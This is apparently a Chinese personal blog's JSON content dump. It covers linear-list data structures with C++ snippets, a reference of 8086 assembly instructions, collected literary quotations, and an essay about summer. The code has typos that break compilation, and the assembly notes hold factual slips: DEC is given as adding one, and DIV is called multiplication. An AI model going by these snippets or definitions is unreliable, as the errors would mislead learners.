数据一旦用线性表存储，各个数据元素之间的相对位置就固定了。 存储结构线性表的存储结构有顺序存储结构和链式存储结构两种，前者称为顺序表，后者称为链表。 顺序存储结构顺序表就是把线性表中的所有元素按照某种逻辑顺序，依次存储到从指定位置开始的一块连续的存储空间，重点是连续的存储空间。 数组长度和线性表的长度区别：数组长度是存放线性表的存储空间的长度，存储分配后这个量一般是不变的，线性表的长度是线性表中数据元素的个数，随着线性表插入和删除操作的进行，这个量是变化的。 在顺序表中，各个表项的逻辑顺序与其存放的物理顺序一致，即第i个表项存储于第i个物理位置（1&lt;i≤n）。 对顺序表中所有表项，既可以进行顺序访问，也可以进行随机访问。也就是说，既可以从表的第一个表项开始逐个访问表项，也可以按照表项的序号（亦称为下标）直接访问表项。 顺序表的静态存储表示：123456#define maxSize 100typedef int T;typedef struct&#123;T data[maxSize];int n;&#125;SeqList; 顺序表的动态存储表示：12345typedef int T;typedef struct&#123;T* data;int maxSize，n;&#125;SeqList; 顺序表搜索算法：123456789template &lt;class T&gt;int Seqlist&lt;T&gt;::search(T&amp; x)&#123;//搜索函数，在表中找到x，找到则返回元素位置，否则返回0//last表示最后一个元素的数组标号，从0开始，表项是从1开始 for(int i=0;i&lt;=last;++i)&#123; if(data[i]==x) return i+1; &#125; return 0;&#125; 顺序表插入算法：123456789101112template &lt;class T&gt;bool Seqlist&lt;T&gt;::insert(int i,T&amp; x)&#123;//将新元素插入到表第i个元素之后，函数返回true，否则返回false if(last==maxsize-1)return false; if(i&lt;0||i&gt;last+1)return false; for(int j=last;j&gt;=i;j--)&#123; data[j+1]=data[j]; &#125; data[i]=x; last++; return true;&#125; 顺序表删除算法：123456789101112template &lt;class T&gt;bool Seqlist&lt;T&gt;::remove(int i,T&amp; x)&#123;//删除第i个表项，通过x返回删除的元素值，成功返回true if(last==-1)return false; if(i&lt;1||i&gt;last+1)return false; x=data[i-1]; for(int j=i;j&lt;=last;j++)&#123; data[j-1]=data[j]; &#125; last--; return true;&#125; 链式存储结构链表，别名链式存储结构或单链表，用于存储逻辑关系为 “一对一” 的数据。与顺序表不同，链表不限制数据的物理存储状态，换句话说，使用链表存储的数据元素，其物理存储位置是随机的。线性表的链式存储结构的特点是用一组任意的存储单元存储线性表的数据元素，这组存储单元可以是连续的，也可以是不连续的，这就意味着这些数据元素可以存在内存未被占用的任意位置。还有一点就是在顺序存储结构中，每个数据空间只需要存储数据元素的信息即可，但是在链式结构中，除了要存储数据元素信息外，还需要存储他的后继元素的存储位置。我们把存储数据元素信息的域称为数据域，把存储直接后继位置的域称为指针域，指针域中存储的信息称为指针或链，数据域和指针域组成数据元素的存储映像，称为结点。 单链表单链表的定义123456789struct linknode&#123; int data; linknode* link;&#125;;class list&#123; private: linknode* first; public:&#125;; 单链表的查找算法12345678910template &lt;class T&gt;linknode&lt;T&gt;* list&lt;T&gt;::search(T X)&#123; //成功的时候返回地址，否则返回null linknode&lt;T&gt;* current = first-&gt;link;//带附加头结点 while(current!=null)&#123; if(current-&gt;data==x)break; else current=current-&gt;link; &#125; return current;&#125; 单链表的插入算法1234567891011template &lt;class T&gt;bool list&lt;T&gt;::inscrt(int i,T&amp; X)&#123; //将新元素插入i结点之后 linknode&lt;T&gt; *current = locate(i);//return i address if(current==null)return false; linknode&lt;T&gt; *newnode = new linknode&lt;T&gt;(x); if(newnode==null)&#123;cerr&lt;&lt;\"error\"&lt;&lt;endl;exit(1)&#125; newnnode-&gt;link=current-&gt;link; current-&gt;link=newnode; return true;&#125; 单链表的删除算法1234567891011template &lt;class T&gt;bool list&lt;T&gt;::remove(int i,T&amp; X)&#123; //将第i个元素删除，x返回被删除的值 linknode&lt;T&gt; *current = locate(i-1);//return i-1 address if(current==null||current-&gt;link==null)return false; linknode&lt;T&gt; *del = current-&gt;link; x=del-&gt;data; current-&gt;link=del-&gt;link; delete del; return true;&#125; 循环链表循环链表（circular list）是另一种形式的表示线性表的链表，它的结点结构与单链表相同，与单链表不同的是链表中表尾结点的link域中不是NULL，而是存放了一个指向链表开始结点的指针。这样，只要知道表中任何一个结点的地址，就能遍历表中其他任一结点。 双向链表双向链表又称为双链表。使用双向链表（doubly linked list）的目的是为了解决在链表中访问直接前驱和直接后继的问题。因为在双向链表中每个结点都有两个链指针，一个指向结点的直接前驱，一个指向结点的直接后继，这样不论是向前驱方向搜索还是向后继方向搜索，其时间开销都只有O(1)。 静态链表如果为数组中每一个元素附加一个链接指针，就形成静态链表结构。它允许我们不改变各元素的物理位置，只要重新链接就能够改变这些元素的逻辑顺序。由于它是利用数组定义的，在整个运算过程中存储空间的大小不会变化，因此称之为静态链表。静态链表的每个结点由两个数据成员构成：data域存储数据，link域存放链接指针。所有结点形成一个结点数组。","categories":[{"name":"数据结构","slug":"数据结构","permalink":"http://aotle.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://aotle.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"常用汇编指令整理","slug":"常用汇编指令整理","date":"2020-06-25T15:12:52.000Z","updated":"2020-12-03T13:52:05.304Z","comments":true,"path":"2020/06/25/huibian/","link":"","permalink":"http://aotle.top/2020/06/25/huibian/","excerpt":"这是一些常用汇编指令的整理。","text":"这是一些常用汇编指令的整理。 数据传送指令通用数据传送指令MOV 格式：MOV dst,src 功能：将src传送到dst 限制：段寄存器间不可直接相互传送，立即数不能直接送段寄存器，CS 不可作为目的操作数。 PUSH &amp; POP 格式：PUSH src &amp; POP dst 功能：将 src 压栈 &amp; 出栈送入 dst 限制：CS 不可作目的操作数 XCHG 格式：XCHG dst,src 含义：交换两个操作数内容（Exchange） 限制：段寄存器不可为操作数，也不能同时为存储单元，两个操作数也不能同时为内存变量。 XLAT 格式：XLAT 含义：转换表（Table Look-up Translation） 功能：把待查表格（表格位于 DS:BX）的一个字节内容送到AL累加器中。在执行该指令前，应将TABLE首地址送至BX寄存器中，然后将待查字节与其在表格中距表首地址位移量送AL,即AL&lt;–((BX)+(AL)). 地址目标传送指令LEA 格式：LEA dst,src 含义：把地址偏移量传送目的操作数（Load Effective Address） 功能：取src地址偏移量送dst 注：源操作数必须是存储单元，目的操作数必须是除段寄存器之外的 16 位寄存器。 LDS &amp; LES 格式：LDS dst,src &amp; LES dst,src 含义：取双字指针送到目的寄存器和 DS/ES 功能：从源操作数指定的存储单元中取出 4 字节，前两个字节送到目的寄存器，后两个字节送到 DS/ES。 标志传送指令PUSHF &amp; POPF 格式：PUSHF &amp; POPF 含义：将标志寄存器压栈/出栈 功能：PUSHF：执行操作: SP=SP-1,(SP)=PSW的高8位, SP=SP-1, (SP)=PSW的低8位，POPF相反。 LAHF &amp; SAHF 格式：LAHF &amp; SAHF 含义：Load(Store) AH from(into) Flags 功能：将标志寄存器低字节送到 AH &amp; 将 AH 送到标志寄存器低字节 输入输出指令IN &amp; OUT 格式：IN AL/AX, ADDR &amp; OUT ADDR, AL/AX 功能：从端口地址（寄存器）获取数据送到寄存器（端口地址） 地址格式：端口地址有两种格式，小于 FFH 时可以是直接写出，否则必须先送入 DX 再使用。 算术运算指令加减法指令ADD &amp; ADC 格式：ADD dst,src &amp; ADC dst,src 含义：（带进位）加法 功能：dst = src + dst (+ CF) INC 格式：INC dst 功能：自增 1，dst = dst + 1 SUB &amp; SBB: 格式：SUB dst,src &amp; SBB dst,src 含义：（带借位）减法 功能：dst = dst - src (- CF) DEC: 格式：DEC dst 功能：自减 1，dst = dst + 1 NEG: 格式：NEG dst 功能：对目的操作数取负，dst = -dst 乘除法指令MUL &amp; IMUL 格式：IMUL src &amp; MUL src 含义：无符号数/整数乘法 功能：只有一个源操作数，当其为 8 位时，AX = AL * src，为 16 位时，（DX,AX）= AX * src DIV &amp; IDIV 格式：IDIV src &amp; DIV src 含义：无符号数/整数乘法 功能：只有一个源操作数作为除数，当其为 8 位时，AX 为被除数，AL 作为商，AH 作为余数。当 src 为 16 位时，（DX,AX）作为被除数，AX 作为商，DX 作为余数。 逻辑运算与移位指令逻辑运算 指令 功能 NOT dst 取反，逻辑非 AND dst,src 逻辑与 OR dst,src 逻辑或 XOR dst,src 异或 算术逻辑移位 指令 含义 功能 SAL dst,cnt Shift Arithmetic Left 算术左移 cnt 位 SAR dst,cnt Shift Arithmetic Right 算术右移 cnt 位 SHL dst,cnt Shift Logic Left 逻辑左移 cnt 位 SHR dst,cnt Shift Logic Right 逻辑右移 cnt 位 cnt 为 1 或者 CL。算术右移时补最高位，逻辑右移补 0，被移出的移入 CF。 循环移位 指令 含义 功能 ROL dst,cnt Rotate Left 循环左移 cnt 位 ROR dst,cnt Rotate Right 循环右移 cnt 位 RCL dst,cnt Rotate through Carry Left 带进位左移 cnt 位 RCR dst,cnt Rotate through Carry Right 带进位右移 cnt 位 字符串操作指令 指令（字节/字） 功能 MOVSB / MOVSW 字符串传送 CMPSB / CMPSW 字符串比较 SCASB / SCASW 字符串扫描 LODSB / LODSW 字符串装入 STOSB / STOSW 字符串存储 对于后三条指令，操作使用 AL/AX 寄存器（根据操作数类型决定）。 源串起始地址为 DS:SI，目的串位于 ES:DI 每一次操作都会自动修改 SI 和 DI DF 标志位可以控制字符串处理方向，DF = 0 递增，DF = 1 递减，可通过 CLD/STD 设置 处理字符串长度放在 CX 中 这些指令前可以用重复前缀 REP 反复执行，或是 REPE/REPZ 相等/为零则重复，REPNE/REPNZ 不相等/非零则重复。 处理器控制指令标志处理指令 指令 含义 功能 CLC Clear Carry CF = 0 CMC Complement Carry CF = NOT CF STC Set Carry CF = 1 CLD Clear Direction DF = 0 STD Set Direction DF = 1 CLI Clear Interrupt IF = 0 STI Set Interrupt IF = 1 外部同步指令ESC 格式：ESC 外部操作码，src 功能：用来实现对 8087 协处理器控制。 WAIT 格式：WAIT 功能：往往跟在 ESC 后等待，直到 TEST 为低电平。 LOCK 格式：LOCK 功能：封锁总线，禁止其他处理器使用总线。 停机和空操作HLT 格式：HLT 功能：进入暂停状态不进行任何操作，直到复位或 NMI 引脚/INTR 引脚出现中断请求信号。 NOP 格式：NOP 功能：耗费三个时钟周期但不进行任何操作。 控制转移指令比较指令CMP 格式：CMP dst,src 功能：用 dst 减去 src，但结果仅反映到标志位，不送回目的操作数。 常见用法：后跟JZ（相等跳转） &amp; JNZ （不相等跳转）。 TEST 格式：TEST dst,src 功能：对两个操作数作逻辑与，结果仅反映到标志位，不送回目的操作数。 常见用法：测试某一位，为 1JNZ跳转，为 0 JZ跳转。 无条件转移JMP 格式：JMP dst 功能：无条件跳转到目的地址。 跳转分为两种，一种是段内转移或近（NEAR）转移，跳转时仅改变 IP 的值，另一种是段间转移或远（FAR）转移，此时跳转长度超过 IP 最大值，CS 和 IP 都要改变。这两种情况都提供直接转移和间接转移两种方法，前者直接给出目的地址，后者将目的地址放在寄存器或者存储单元中。 类型 方式 寻址目标 举例 段内 直接 立即短转移（8位） JMP SHORT 标号 段内 直接 立即近转移（16位） JMP NEAR PTR 标号或JMP 标号 段内 间接 寄存器（16位） JMP BX 段内 间接 存储器（16位） JMP WORD PTR 5[BX] 段间 直接 立即转移（32位） JMP FAR PTR 标号 段间 间接 存储器（32位） JMP DWORD PTR[REG] CALL 格式：CALL 过程名 功能：调用过程。 同样有段内与段间，直接与间接的区分，指令格式与 JMP 类似。 类型 方式 寻址目标 举例 段内 直接 立即调用 CALL 标号 段内 间接 寄存器（16位） CALL BX 段内 间接 存储器（16位） CALL WORD PTR 5[BX] 段间 直接 立即调用（32位） CALL FAR PTR 标号 段间 间接 存储器（32位） CALL DWORD PTR[REG] RET 格式：RET (n) 功能：过程返回。如果有 n 则在弹出返回地址后再弹出 n 个字节，这一目的是让调用过程可以传递参数。 条件转移 格式：操作符 标号 功能：根据操作符，满足即跳转到标号。 直接标志转移 指令 测试条件 判断条件 JC/JNC CF = 1 / 0 有 / 无进位 JZ/JNZ ZF = 1 / 0 相等 / 不相等 JE/JNE ZF = 1 / 0 相等 / 不相等 JS/JNS SF = 1 / 0 符号为负 / 正 JO/JNO OF = 1 / 0 溢出 / 无溢出 JP/JNP PF = 1 / 0 为偶数 / 奇数 JPE/JPO PF = 1 / 0 为偶数 / 奇数 无符号数比较测试 指令 测试条件 判断条件 JA/JNBE CF ∨∨ ZF = 0 高于 / 不低于等于 JAE/JNB CF = 0 高于等于 / 不低于 JNAE/JB CF = 1 不高于等于 / 低于 JNA/JBE CF ∨∨ ZF = 1 不高于 / 低于等于 有符号数比较测试 指令 测试条件 判断条件 JG/JNLE (SF XORXOR OF) ∨∨ ZF = 0 大于 / 不小于等于 JGE/JNL SF XORXOR OF = 0 大于等于 / 不小于 JNGE/JL SF XORXOR OF = 1 不大于等于 / 小于 JNG/JLE (SF XORXOR OF) ∨∨ ZF = 1 不大于 / 小于等于 循环控制指令LOOP 格式：LOOP 标号 功能：跳至标号继续循环，每执行一次 CX 减一，若减一后为零则不跳转。 LOOPE &amp; LOOPNE 格式：LOOPE 标号 &amp; LOOPNE 标号 功能：（不）相等时循环，其他与 LOOP 相同。 LOOPZ &amp; LOOPNZ 格式：LOOPZ 标号 &amp; LOOPNZ 标号 功能：结果（不）为零时循环，其他与 LOOP 相同。 JCXZ 格式：JCXZ 标号 功能：CX 为零则跳转，否则就往下执行， CS 不会减一。 中断指令INT 格式：INT n 功能：调用 n 对应的功能。 INTO 格式：INTO 功能：如果溢出标识 OF 为 1 则产生类型为 4 的中断，否则就继续向下执行。 IRET 格式：IRET 功能：中断返回。 BIOS &amp; DOS 调用调用这两者用的是 INT 中断指令。 格式：INT n 功能：调用 n 对应的功能。 其中 n = 21H 是最为强大的 DOS 中断。一般调用中断须先将参数放入指定寄存器，功能号放入 AH，子功能号放入 AL，例如 12MOV AX,4C00H INT 21H 常用的功能号有 功能号 功能 参数 01H 输入一个字符 AL = 输入字符 0AH 输入字符串 DX:DX = 缓冲区首地址 02H 显示一个字符 DL = 显示字符 09H 显示 $ 结尾的字符串 DX:DX = 字符串首地址 常用伪指令数值回送操作符TYPE 格式：TYPE expression_r(or label) 功能：返回变量以字节数表示的类型 &amp; 返回标号类型的数值 LENGTH 格式：TYPE variable 功能：对于变量使用DUP的情况,将回送分配给该变量的单元数; 对其它情况则回送1 SIZE 格式：TYPE variable 功能：回送分配给该变量的字节数 = TYPE * LENGTH OFFSET 格式：TYPE variable (or lable) 功能：回送变量或标号的偏移地址 SEG 格式：TYPE variable (or lable) 功能：回送变量或标号的段地址 数据定义语句 DB 定义字节,表示其后每个操作数占有一个字节(1Byte)单元 DW 定义字,表示表示其后每个操作数占有一个字(2Byte)单元 123data_byte DB 10 , 4 , 10H , ? ;共定义了4个字节,其中 &#39;?&#39; 是保留单元data_word DW 100 DUP(?) ;定义100个字的存储空间","categories":[{"name":"汇编","slug":"汇编","permalink":"http://aotle.top/categories/%E6%B1%87%E7%BC%96/"}],"tags":[{"name":"汇编","slug":"汇编","permalink":"http://aotle.top/tags/%E6%B1%87%E7%BC%96/"}]},{"title":"短句分享","slug":"短句分享","date":"2020-06-23T06:26:06.000Z","updated":"2020-12-03T13:52:40.477Z","comments":true,"path":"2020/06/23/duanju1/","link":"","permalink":"http://aotle.top/2020/06/23/duanju1/","excerpt":"摘抄了一些很美的短句","text":"摘抄了一些很美的短句 1/ 四月，应该坦坦荡荡，鸽子从屋檐拥向晴空，青藤从粉墙探向枝头，新茶从瓷碗吻向老桌，传说从故纸堆里挣脱，你带着苍绿的情书，生锈的戒指，以及喑哑的晚钟，风尘仆仆 ，从远方，奔向我 ，趁风月无边，浮了这盅千里烟波，从此隐入山中，陪你赏朝昏夕落。 2/ 你是一台磨人的机器 盛产爱和诗意 3/ 我喜欢的少年打天上来 他无意掀翻烛火 点燃我双眸盛满的暮色 4/ ᴹᵉᵉᵗ ʸᵒᵘ ᶠᵘˡˡ ᵒᶠ ˡᵒᵛᵉ / ˢᵉᵉ ᵉᵛᵉʳʸᵗʰⁱⁿᵍ ⁱⁿ ᵗʰᵉ ʷᵒʳˡᵈ / ᶠᵃˡˡ ⁱⁿ ˡᵒᵛᵉ ʷⁱᵗʰ ʸᵒᵘ. 遇见你爱意汹涌，看世间万物，都浪漫心动。 5/ 山野千里，你是我藏在星星里的浪漫，无尽的温柔与风情都隐匿在皎月清辉中，今晚月色极美，我双手为你奉上 6/ 纯洁无暇的善良不够善良。 遭遇过一切挫折与人性考验后的善良温柔有力量。 7/ 很喜欢「日暮里」和「次日清晨」这两个词。一天的喜怒哀乐都溜进日暮里，在次日清晨给人以重新开始的无限可能。 疲倦落入温柔暮色里，我会在次日清晨醒着眼睛。 8/ あなたの优しさに私は心を引かれた 你的温柔打动了我的心 9/ 我是如此单独而完整 在无数个夜晚我独自顶着冷风 伫立在老橘树下的桥头 只为听一曲夜莺的哀歌 我倚暖了石栏上的青苔 青苔凉透了我的心坎 但夜莺不来夜莺不来 ——徐志摩 《我是如此单独而完整》 10/ 千般荒凉，以此为梦。万里蹀躞，以此为归。 ——余秋雨 11/ 太阳未出时，全世界都做一个梦，唯有月亮是真实的； 太阳出来后，全世界都真实了，唯有月亮像一个梦。 ——《冬牧场》 12/ ᵂᵃⁿᵗ ᵗᵒ ᵇᵉ ʸᵒᵘʳ / ᵖⁱˡˡᵒʷ ᵇᵒᵒᵏ / ᶜᵃᵗ ⁱⁿ ʸᵒᵘʳ ᵃʳᵐˢ / ˡᵒᵛᵉᵈ ᵒⁿᵉ. 想做你的枕边书，怀中猫，意中人。 13/ 你踩着漫长星辰的光而来，而我在你到来的刹那便失了心智，从此山河过往，凛冬天明，你都有我。 14/ 树在 山在 大地在 岁月在 我在 你还要怎样更好的世界? ——张晓风《我在》 15/ ᴱˣᵖᵉʳⁱᵉⁿᶜⁱⁿᵍ ᵃ ᵖᵉʳˢᵒⁿ’ˢ ˡᵒⁿᵉˡⁱⁿᵉˢˢ, ᵇᵘᵗ ᵃˡˢᵒ ᵉˣᵖᵉʳⁱᵉⁿᶜⁱⁿᵍ ᵗʰᵉ ᵍⁱᶠᵗ ᵒᶠ ˡᵒⁿᵉˡⁱⁿᵉˢˢ. 经历着一个人的孤独，也经历着孤独的馈赠。 16/ 我是个俗气至顶的人， 见山是山，见海是海，见花便是花。 唯独见了你， 云海开始翻涌，江潮开始澎湃， 昆虫的小触须挠着全世界的痒。 你无需开口，我和天地万物便通通奔向你。 17/ 余光中先生说，月色与雪色之间，你是第三种绝色，于我而言,日月星辉之中,你是第四种难得。 18/ 昼も夜も春も渡らず，夜も眠れない星 白日春不渡，黑夜万梦星。 19/ 我是半坏街灯 是将冷煤炭 闪闪烁烁 明明暗暗 只想把有限的光和热 全都给你。 20/ 我怀念那个秋天，但我不会因此止步不前我会把有关你的记忆隐于心弦，当然不包括那偶尔泄出的一些思念。 21/ ᵀʰᵉ ᵍʳᵉᵃᵗᵉˢᵗ ʳᵒᵐᵃⁿᶜᵉ ⁱˢ ᵗʰᵉ ᶠᵒᶜᵘˢ ᵒᶠ ᵒⁿᵉ’ˢ ˡⁱᶠᵉ. 最盛大的浪漫是终其一生的专注。 22/ 我希望有个如你一般的人 如山间清爽的风如古城温暖的光，从清晨到夜晚，由山野到书房，不怕路途遥远，只要最后是你就好。 23/ 我想和你一起生活 在某个小镇 共享无尽的黄昏 和绵绵不绝的钟声 ——茨 维塔耶娃 24/ ᴵ ʰᵃᵛᵉ ˢᵃᵛᵉᵈ ᵗᵉⁿᵈᵉʳⁿᵉˢˢ ᵃⁿᵈ ʳᵒᵐᵃⁿᶜᵉ ᶠᵒʳ ᵃ ˡᵒⁿᵍ ᵗⁱᵐᵉ. ᴵ ʷᵃⁿᵗ ᵗᵒ ᵍⁱᵛᵉ ⁱᵗ ᵗᵒ ʸᵒᵘ ᵃˡˡ ᵃᵗ ᵒⁿᶜᵉ. 攒了好久的温柔与浪漫，想要一次性都给你。 25/ 岁月极美，在于它必然的流逝。 春花、秋月、夏日、冬雪。 26/ 今夜（こんや）は月（つき）が綺麗（きれい）ですね。 今晚月色真美。 27/ 世人慌慌张张，不过是图碎银几两。偏偏这碎银几两，能解世间惆怅，可让父母安康，可护幼子成长，但这碎银几两，也断了儿时的念想，让少年染上沧桑，压弯了脊梁。 28/ 我是春天里出生的绿皮野兽 在秋夜里吞下十瓣月亮 ——《桔子》高鹤鸣 29/ 夏天属于散文和柠檬，属于裸露和慵懒，属于关于回归的想像的永恒闲置，属于稀见的长笛和赤裸的双足，还有八月的卧室卧室中绞结的床单和周日的盐 ——德里克·沃尔科特《夏天的布里克街》 30/ 读书到某个相似段落的恍神，在外喝冷饮唤起味觉的苏醒，抑或是整理旧衣物时不落痕迹的叹息。这些由你衍生出来的琐碎，在数年如一日的白夜里，融汇成轻柔而遥远的光河。不再触及我。却依然照耀我。 31/ 最短暂的幸福感和最漫长的余韵，在到达最顶峰的时候迫近死亡，每个人的生命中都有一段summer time。 32/ 你已穿上书页般的衣冠 步行在恭敬的瓶形尸首间 ——张枣《十月之水》 33/ 谁端着夜的筛子将一粒粒光豆豆不停地筛了出来——《星空》 34/ 我是馊掉的柳丁汁和浓汤，我是爬满虫卵的玫瑰和百合，我是灯火流离的都市里明明存在却没人看得到也没人需要的北极星。 ——林奕含《房思琪的初恋乐园》 35/ 夕阳染病像潦倒的诗人醉落西湖——《夕阳西下》周末有约 36/ 阳光退出院子，退得那么慢，其间还有多次停顿，如同一种哽咽。 ——余秀华《月光落在左手上》 37/ 掉头一去是风吹黑发，回首再来已雪满白头。 下次你路过，人间已无我。 ——余光中《欢呼哈雷》 38/ 他来时风尘仆仆，停时依旧是光。 ——高台树色《白日事故》","categories":[{"name":"随笔","slug":"随笔","permalink":"http://aotle.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://aotle.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"夏天的风","slug":"夏天的风","date":"2020-06-21T04:33:42.000Z","updated":"2020-12-03T13:57:36.476Z","comments":true,"path":"2020/06/21/xiatiandefeng/","link":"","permalink":"http://aotle.top/2020/06/21/xiatiandefeng/","excerpt":"“在夏天，我们吃绿豆、桃、樱桃和甜瓜。在各种意义上都漫长且愉快，日子发出声响。” ​ ——罗伯特·瓦尔泽《夏天》","text":"“在夏天，我们吃绿豆、桃、樱桃和甜瓜。在各种意义上都漫长且愉快，日子发出声响。” ​ ——罗伯特·瓦尔泽《夏天》 喜欢夏天，大概是因为夏日有一种特别的感觉吧。 夏天和雨天一样，有一种特别的韵味。夏天也很有故事感，记忆中好多事都是发生在夏天。夏天也有童年，青春的味道。 尤其是夏日的午后，蝉声鸣叫，很多人在午睡，全世界就好像安静了下来，只剩自然的声音。 时光流逝得很慢，蓝蓝的天空，强烈的阳光，喜欢的人。是我爱得无法自拔的夏日～ 印象最深的仍然是那个起风了的夏天，当时的冰淇淋很冰也很甜。 暗晚风吹起你鬓间的发，抚平回忆留下的疤，你的眼中明交杂，一笑生花。当时是18年的夏天，也是高中毕业的那个夏天。有很复杂的感情，怀念那时的同学，怀念高三的教室，怀念当初那个懵懂无知的自己，怀念着我的青春。 我们回忆18年的夏天，不是回忆某一年的夏天，每个夏天都不一样，每个人青春的基调却是一样的，有着遗憾，仓促，惋惜 在这之中，我们变成为现在的自己 不一定说是我们一定变好了，只是，我们终究长大了 我们怀念的夏天，只属于我们这一代人 每一代人的青春都只属于自己 就像我曾经深爱的你 后悔吗？ 不知道 太多太多理由让我喜欢这个季节了 湛蓝湛蓝的天空，饱满饱满的云朵，树林阴影里穿过凉风，白杨树浓密的叶子簌簌作响，一望无际的田野带着幽香，浓烈的太阳晒得人直发昏，汽车飞驰而过会卷起街道上的尘土，深井里有清冽的凉水，地窖里有甘甜的西瓜，阴凉土房里有的舒服过堂风，漫长的午觉伴着声嘶力竭的蝉鸣。 学校里还有开了的合欢树，有月季花田，有玉簪，有大湖，外面的小南门里有炸鸡，有热干面，有寿司，有炸串，有麻辣烫，有西瓜。 在学校，每次下晚课回去的路上很热闹，有情侣争吵，也有热情调笑，他们走在一起，就像青春飘荡在夏风中 去年夏天我一个人走了很多没走过的路，也遇见和失去了喜欢的人 我看见了烟波画船，云霞翠轩感受到了朝飞暮卷，雨丝风片 晚上有时会在小区里溜达，好天气的夜空中能看见浓烈的流云，云片被夜风吹的翻飞。有时也能看见星星。有时也经常和朋友一起去烧烤，坐在露天烧烤摊，吃很多牛板筋，烤土豆，豆角，金针菇，喝下大杯的啤酒，满桌子的小龙虾残骸还有蛤蜊壳。 夕阳在楼区间若隐若现，晚霞也都被分割成一条一条。 绿槐高柳咽新蝉，薰风初入弦。碧纱窗下水沉烟，棋声惊昼眠。微雨过，小荷翻，榴花开欲然。玉盆纤手弄清泉，琼珠碎却圆。·我喜欢夏日的永昼，我喜欢在多风的黄昏独坐在傍山的阳台上。小山谷里稻浪推涌，美好的稻香翻腾着。慢慢地，绚丽的云霞被浣净了，柔和的晚星一一就位。——张晓风《我喜欢》 微风拂过海面，蝉鸣漾入云间。叽叽喳喳的笑声在沙滩上留下深浅不一的足迹，盛暑阳光夺神炫目，模糊了远近的归船。 我希望今年的夏天还能走很多很多的路，吃很多烧烤，西瓜和冰棍。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://aotle.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://aotle.top/tags/%E9%9A%8F%E7%AC%94/"}]}],"categories":[{"name":"java","slug":"java","permalink":"http://aotle.top/categories/java/"},{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"网络编程","slug":"网络编程","permalink":"http://aotle.top/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"密码学","slug":"密码学","permalink":"http://aotle.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"http://aotle.top/categories/C/"},{"name":"其他","slug":"其他","permalink":"http://aotle.top/categories/%E5%85%B6%E4%BB%96/"},{"name":"javascript","slug":"javascript","permalink":"http://aotle.top/categories/javascript/"},{"name":"PHP","slug":"PHP","permalink":"http://aotle.top/categories/PHP/"},{"name":"数据结构","slug":"数据结构","permalink":"http://aotle.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"汇编","slug":"汇编","permalink":"http://aotle.top/categories/%E6%B1%87%E7%BC%96/"},{"name":"随笔","slug":"随笔","permalink":"http://aotle.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"java","slug":"java","permalink":"http://aotle.top/tags/java/"},{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"sql注入","slug":"sql注入","permalink":"http://aotle.top/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"网络编程","slug":"网络编程","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"密码学","slug":"密码学","permalink":"http://aotle.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"},{"name":"贪心算法","slug":"贪心算法","permalink":"http://aotle.top/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"},{"name":"STL","slug":"STL","permalink":"http://aotle.top/tags/STL/"},{"name":"动态规划","slug":"动态规划","permalink":"http://aotle.top/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"其他","slug":"其他","permalink":"http://aotle.top/tags/%E5%85%B6%E4%BB%96/"},{"name":"javascript","slug":"javascript","permalink":"http://aotle.top/tags/javascript/"},{"name":"PHP","slug":"PHP","permalink":"http://aotle.top/tags/PHP/"},{"name":"数据结构","slug":"数据结构","permalink":"http://aotle.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"汇编","slug":"汇编","permalink":"http://aotle.top/tags/%E6%B1%87%E7%BC%96/"},{"name":"随笔","slug":"随笔","permalink":"http://aotle.top/tags/%E9%9A%8F%E7%AC%94/"}]}